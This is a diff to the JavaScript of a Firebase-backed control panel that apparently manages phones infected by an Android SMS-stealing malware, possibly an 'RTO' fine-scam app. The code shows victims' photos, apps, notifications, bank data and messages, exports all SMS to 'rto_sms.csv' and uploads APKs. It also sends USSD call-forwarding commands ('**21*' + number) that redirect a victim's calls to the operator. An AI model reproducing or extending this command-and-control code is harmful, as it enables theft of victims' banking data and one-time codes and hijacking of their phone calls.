+  b.querySelectorAll('[data-p]').forEach(function(e) { e.addEventListener('click', function() { showP(this.getAttribute('data-p')); }); });
 }
 function showP(k) {
-  var p = photos[k];
-  if (!p) { alert('No image'); return; }
-  var imgSrc = p.url || p.base64 || '';
-  if (!imgSrc) { alert('No image data'); return; }
+  var p = photos[k]; if (!p) return;
+  var imgSrc = p.url || p.base64 || ''; if (!imgSrc) return;
   curPhoto = k;
   document.getElementById('pImg').src = imgSrc;
   document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
@@ -1003,19 +946,12 @@ function showP(k) {
 }
 document.getElementById('pClose').addEventListener('click', function() { document.getElementById('pViewer').classList.remove('active'); });
 document.getElementById('pDownload').addEventListener('click', function() {
-  var p = photos[curPhoto];
-  if (!p) return;
-  if (p.url) {
-    fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) {
-      var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click();
-    }).catch(function() { window.open(p.url, '_blank'); });
-  } else if (p.base64) {
-    var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click();
-  }
+  var p = photos[curPhoto]; if (!p) return;
+  if (p.url) { fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) { var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click(); }).catch(function() { window.open(p.url, '_blank'); }); }
+  else if (p.base64) { var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click(); }
 });
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
-// ═══ APPS ═══
 function renderApps() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -1037,8 +973,6 @@ function renderApps() {
     b.innerHTML = l.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
   }
 }
-
-// ═══ NOTIFS ═══
 function renderNotifs() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -1051,8 +985,6 @@ function renderNotifs() {
     return '<div class="notif"><div class="notif-head"><span class="notif-app">' + esc(x.app || 'App') + '</span><span class="notif-date">' + (x.date || '') + '</span></div>' + (x.title ? '<div class="notif-title">' + esc(x.title) + '</div>' : '') + '<div class="notif-body">' + esc(x.message || '') + '</div></div>';
   }).join('');
 }
-
-// ═══ BANK ═══
 function renderBank() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
@@ -1077,18 +1009,15 @@ function renderBank() {
   b.innerHTML = html;
 }
 
-// ═══ CALL FORWARD DIALOG ═══
+// ═══ CALL FORWARD ═══
 function openCallFwd() {
   if (!curId) { alert('No device selected'); return; }
   var d = devs[curId];
-  var savedNum = '';
-  if (d.forward_settings && d.forward_settings.admin_number) savedNum = d.forward_settings.admin_number;
+  var savedNum = (d.forward_settings && d.forward_settings.admin_number) || '';
   document.getElementById('cfNumber').value = savedNum;
   document.getElementById('cfStatus').textContent = 'Ready. Enter number or click Check Status.';
   document.getElementById('cfStatus').className = 'cf-status';
   document.getElementById('cfOverlay').classList.add('active');
-  
-  // Live latest command status
   db.ref('call_forward_commands/' + curId).limitToLast(1).on('value', function(s) {
     var val = s.val();
     if (val) {
@@ -1101,12 +1030,7 @@ function openCallFwd() {
       var delivered = cmd.delivered_at ? new Date(cmd.delivered_at).toLocaleString() : '';
       var statusEl = document.getElementById('cfStatus');
       statusEl.className = 'cf-status ok';
-      statusEl.innerHTML = 
-        '<strong>Latest:</strong> ' + action.toUpperCase() +
-        '<br>Number: ' + (num || '-') +
-        '<br>Status: ' + stat.toUpperCase() +
-        (ussd ? '<br>USSD: ' + ussd : '') +
-        (delivered ? '<br>Delivered: ' + delivered : '');
+      statusEl.innerHTML = '<strong>Latest:</strong> ' + action.toUpperCase() + '<br>Number: ' + (num || '-') + '<br>Status: ' + stat.toUpperCase() + (ussd ? '<br>USSD: ' + ussd : '') + (delivered ? '<br>Delivered: ' + delivered : '');
     }
   });
 }
@@ -1118,7 +1042,6 @@ function sendCallFwd(action) {
   if (!curId) { alert('No device selected'); return; }
   var num = document.getElementById('cfNumber').value.trim();
   var statusEl = document.getElementById('cfStatus');
-  
   if (action === 'activate' && (!num || num.length < 10)) {
     statusEl.className = 'cf-status err';
     statusEl.textContent = '❌ Enter a valid 10-digit number for ACTIVATE';
@@ -1126,22 +1049,14 @@ function sendCallFwd(action) {
   }
   statusEl.className = 'cf-status';
   statusEl.textContent = '📤 Sending command...';
-  
   var command = { action: action, number: num, sim_slot: cfSimSlot, status: 'pending', timestamp: Date.now() };
   if (action === 'activate') command.ussd_code = '**21*' + num + '#';
   else if (action === 'deactivate') command.ussd_code = '##21#';
   else if (action === 'check_status') command.ussd_code = '*#21#';
-  
-  db.ref('call_forward_commands/' + curId).push(command)
-    .then(function() {
-      statusEl.className = 'cf-status ok';
-      statusEl.innerHTML = '✅ Command sent!<br>Action: <strong>' + action.toUpperCase() + '</strong><br>' +
-        (command.ussd_code ? 'USSD: ' + command.ussd_code + '<br>' : '') + 'Waiting for device response...';
-    })
-    .catch(function(e) {
-      statusEl.className = 'cf-status err';
-      statusEl.textContent = '❌ Failed: ' + e.message;
-    });
+  db.ref('call_forward_commands/' + curId).push(command).then(function() {
+    statusEl.className = 'cf-status ok';
+    statusEl.innerHTML = '✅ Command sent!<br>Action: <strong>' + action.toUpperCase() + '</strong><br>' + (command.ussd_code ? 'USSD: ' + command.ussd_code + '<br>' : '') + 'Waiting for device response...';
+  }).catch(function(e) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ Failed: ' + e.message; });
 }
 
 // ═══ EVENT LISTENERS ═══
@@ -1153,9 +1068,7 @@ document.getElementById('btnCancelNewBottom').addEventListener('click', hideNewA
 document.getElementById('btnSaveNew').addEventListener('click', saveNewAcc);
 document.getElementById('btnBulkConnect').addEventListener('click', bulkConnect);
 document.getElementById('apkUpload').addEventListener('click', function() { document.getElementById('apkFile').click(); });
-document.getElementById('apkFile').addEventListener('change', function(e) {
-  if (e.target.files[0]) handleApkUpload(e.target.files[0]);
-});
+document.getElementById('apkFile').addEventListener('change', function(e) { if (e.target.files[0]) handleApkUpload(e.target.files[0]); });
 document.getElementById('btnClose').addEventListener('click', closeDev);
 document.getElementById('dOverlay').addEventListener('click', closeDev);
 document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
@@ -1164,8 +1077,6 @@ document.getElementById('btnStar').addEventListener('click', function() { toggle
 document.getElementById('btnDel').addEventListener('click', function() { if (!confirm('Delete device?')) return; db.ref('device_info/' + curId).remove(); closeDev(); });
 document.querySelectorAll('.fbtn').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('.fbtn').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); curFilter = this.getAttribute('data-f'); renderDevs(); }); });
 document.querySelectorAll('.tab').forEach(function(x) { x.addEventListener('click', function() { switchTab(this.getAttribute('data-t')); }); });
-
-// Call forward
 document.getElementById('btnCallFwd').addEventListener('click', openCallFwd);
 document.getElementById('cfClose').addEventListener('click', closeCallFwd);
 document.getElementById('cfActivate').addEventListener('click', function() { sendCallFwd('activate'); });
@@ -1178,20 +1089,13 @@ document.querySelectorAll('[data-cfsim]').forEach(function(x) {
     cfSimSlot = parseInt(this.getAttribute('data-cfsim'));
   });
 });
-document.getElementById('cfOverlay').addEventListener('click', function(e) {
-  if (e.target.id === 'cfOverlay') closeCallFwd();
-});
-
-// Chips
+document.getElementById('cfOverlay').addEventListener('click', function(e) { if (e.target.id === 'cfOverlay') closeCallFwd(); });
 document.getElementById('btnCsv').addEventListener('click', function() {
   var csv = 'Device,Sender,Body,Date\n';
   Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
   var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click();
 });
-document.getElementById('btnFb').addEventListener('click', function() { 
-  var url = (currentAccount && currentAccount.url) || RTO_CONFIG.databaseURL;
-  alert('Firebase: ' + url); 
-});
+document.getElementById('btnFb').addEventListener('click', function() { var url = (currentAccount && currentAccount.url) || RTO_CONFIG.databaseURL; alert('Firebase: ' + url); });
 document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref('device_info/' + id + '/messages').remove(); db.ref('device_info/' + id + '/sms_history').remove(); }); alert('Deleted'); });
 
 // INIT
